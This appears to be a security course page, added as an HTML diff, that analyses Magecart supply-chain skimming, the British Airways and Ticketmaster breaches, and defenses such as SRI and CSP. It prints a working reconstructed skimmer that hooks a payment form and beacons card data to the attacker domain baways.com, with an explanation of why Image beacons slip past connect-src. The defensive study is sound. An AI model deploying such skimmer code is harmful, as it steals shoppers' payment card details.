@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Case Study — Magecart &amp; Supply Chain XSS</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:36px 32px;max-width:860px}
+  h1{font-size:24px;font-weight:800;color:var(--accent);margin-bottom:6px}
+  .meta{font-size:12px;color:var(--muted);margin-bottom:28px}
+  h2{font-size:16px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:5px;border-bottom:1px solid var(--border)}
+  p{font-size:14px;line-height:1.7;color:var(--text);margin-bottom:12px}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--orange);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:6px;padding:16px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);overflow-x:auto;margin:12px 0;white-space:pre-wrap}
+  .callout{background:var(--panel);border-left:3px solid var(--warn);padding:12px 16px;border-radius:0 6px 6px 0;margin:16px 0;font-size:13px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;display:inline-block;margin-right:4px}
+  .t-supply{background:#0d1a30;color:var(--accent)}
+  .t-cve{background:#2a0000;color:var(--danger)}
+  nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .skimmer-note{font-size:11px;color:var(--muted);margin-top:4px}
+</style>
+</head>
+<body>
+
+<h1>Magecart — Supply Chain XSS</h1>
+<div class="meta">
+  <span class="tag t-supply">SUPPLY CHAIN</span>
+  <span class="tag t-cve">SKIMMER</span>
+  Active 2015–present &nbsp;|&nbsp; Notable victims: British Airways, Ticketmaster, Newegg &nbsp;|&nbsp; Module: M16
+</div>
+
+<h2>What is Magecart?</h2>
+<p>Magecart is the collective name for a group of threat actors (and the attack technique they popularised) that inject JavaScript skimmers into e-commerce payment pages to steal payment card data. The injection method is supply chain compromise: rather than attacking the target site directly, Magecart compromises a third-party JavaScript dependency that the target site loads.</p>
+<p>This is technically XSS — malicious JavaScript executing on a payment page and exfiltrating data. The novel element is the injection vector: the attacker injects into a JS file that is served to thousands of sites, rather than finding an XSS vulnerability in each target individually.</p>
+
+<h2>Attack Flow</h2>
+<pre>Attacker compromises CDN / third-party JS provider
+         ↓
+Malicious code injected into legitimate JS file
+         ↓
+Target site loads JS from the provider (no changes to target)
+         ↓
+Malicious JS executes in victim browser on the payment page
+         ↓
+JS listens for form submit → harvests card data → exfiltrates to attacker's server
+         ↓
+Real transaction proceeds → victim unaware</pre>
+
+<h2>The British Airways Breach (2018)</h2>
+<p>The most prominent Magecart incident. Attackers compromised a JavaScript file on British Airways' CDN. The injected skimmer ran on the BA booking flow (ba.com/booking) and exfiltrated card data to <code>baways.com</code> — a lookalike domain registered by the attackers two weeks before the attack.</p>
+<p>The skimmer ran undetected for <strong>15 days</strong> (August 21 – September 5, 2018) before a researcher at RiskIQ discovered it by comparing the current JS files against archived versions. Approximately 500,000 customers' card details were stolen.</p>
+<p>The ICO (UK Information Commissioner's Office) fined British Airways £20 million under GDPR (reduced from an initial £183 million notice).</p>
+
+<h3 style="font-size:13px;color:var(--accent);margin:16px 0 8px">Reconstructed Skimmer (simplified)</h3>
+<pre>(function() {
+  document.querySelector('[name="paymentForm"]')
+    .addEventListener('submit', function() {
+      var data = {
+        name:   q('[name="cardName"]'),
+        number: q('[name="cardNumber"]'),
+        expiry: q('[name="expiryMonth"]') + '/' + q('[name="expiryYear"]'),
+        cvv:    q('[name="cvvNumber"]'),
+        email:  q('[name="email"]'),
+        src:    location.href
+      };
+      new Image().src = 'https://baways.com/gateway/v1/cdn?' +
+        Object.keys(data).map(k => k+'='+encodeURIComponent(data[k])).join('&');
+    });
+
+  function q(sel) {
+    var el = document.querySelector(sel);
+    return el ? el.value : '';
+  }
+})();</pre>
+<div class="skimmer-note">22 lines. Listens for form submit. Collects all payment fields. Sends to attacker's domain via Image beacon (avoids CORS). Does not cancel the submit — the real transaction goes through.</div>
+
+<div class="callout">
+<strong>Why Image beacon?</strong> Using <code>new Image().src = attacker_url</code> to exfiltrate data is a common technique because: (1) it's a GET request, so no CORS preflight; (2) CSP <code>connect-src</code> doesn't apply to image loads — you also need <code>img-src</code>; (3) browsers don't show image requests in the network tab as obviously as fetch/XHR. Some older CSP advisories forgot to restrict img-src alongside connect-src.
+</div>
+
+<h2>The Ticketmaster Breach (2018)</h2>
+<p>A parallel incident with a critical architectural difference. Attackers compromised <strong>Inbenta Technologies</strong>, a chat support widget provider. Inbenta served different JS to each customer — so only Ticketmaster UK's customers were affected, not all Inbenta customers.</p>
+<p>The critical architectural mistake: Ticketmaster UK loaded the Inbenta script from a <strong>subdomain of ticketmaster.com</strong> (<code>inbenta.ticketmaster.com</code>). This made the script <em>same-origin</em> with the payment page. The script had unrestricted access to all DOM content, cookies, and could make credentialed requests to the Ticketmaster API.</p>
+<p>If the script had been loaded from <code>cdn.inbenta.com</code> (Inbenta's own domain), it would be cross-origin — restricted by browser same-origin policy. By hosting it on a Ticketmaster subdomain, Ticketmaster inadvertently gave the third-party full same-origin access.</p>
+
+<h2>Defenses</h2>
+
+<p><strong>Subresource Integrity (SRI)</strong> — the most direct defense:</p>
+<pre>&lt;script
+  src="https://cdn.example.com/lib.js"
+  integrity="sha256-[hash of expected file]"
+  crossorigin="anonymous"&gt;&lt;/script&gt;</pre>
+<p>If the CDN serves a modified file, the hash won't match — the browser refuses to execute it. SRI would have blocked both the BA and Ticketmaster skimmers immediately.</p>
+
+<p><strong>Content Security Policy — connect-src + img-src</strong>:</p>
+<pre>Content-Security-Policy:
+  connect-src 'self' https://ba.com;
+  img-src 'self' data:;</pre>
+<p>The Image beacon exfiltration to <code>baways.com</code> would fail. This defense requires correctly restricting <em>both</em> connect-src and img-src — a common oversight is restricting only connect-src.</p>
+
+<p><strong>Third-party script hosting policy:</strong></p>
+<p>Never host third-party scripts on subdomains of your own domain. If a third-party script must run on your page, load it from the third party's own domain and apply SRI. A script at <code>cdn.vendor.com</code> is cross-origin; a script at <code>vendor.yoursite.com</code> is same-origin. The difference is full DOM access.</p>
+
+<p><strong>Continuous integrity monitoring:</strong></p>
+<p>Compare deployed JS file hashes against expected hashes on every deployment and periodically thereafter. BA's skimmer ran for 15 days because no monitoring detected that a JS file had changed. A daily diff against a known-good baseline would have detected the change within 24 hours.</p>
+
+<nav>
+  <a href="twitter_worm.html">← Twitter Worm</a>
+  <a href="ba_breach.html">Next: BA Deep Dive →</a>
+</nav>
+
+</body>
+</html>
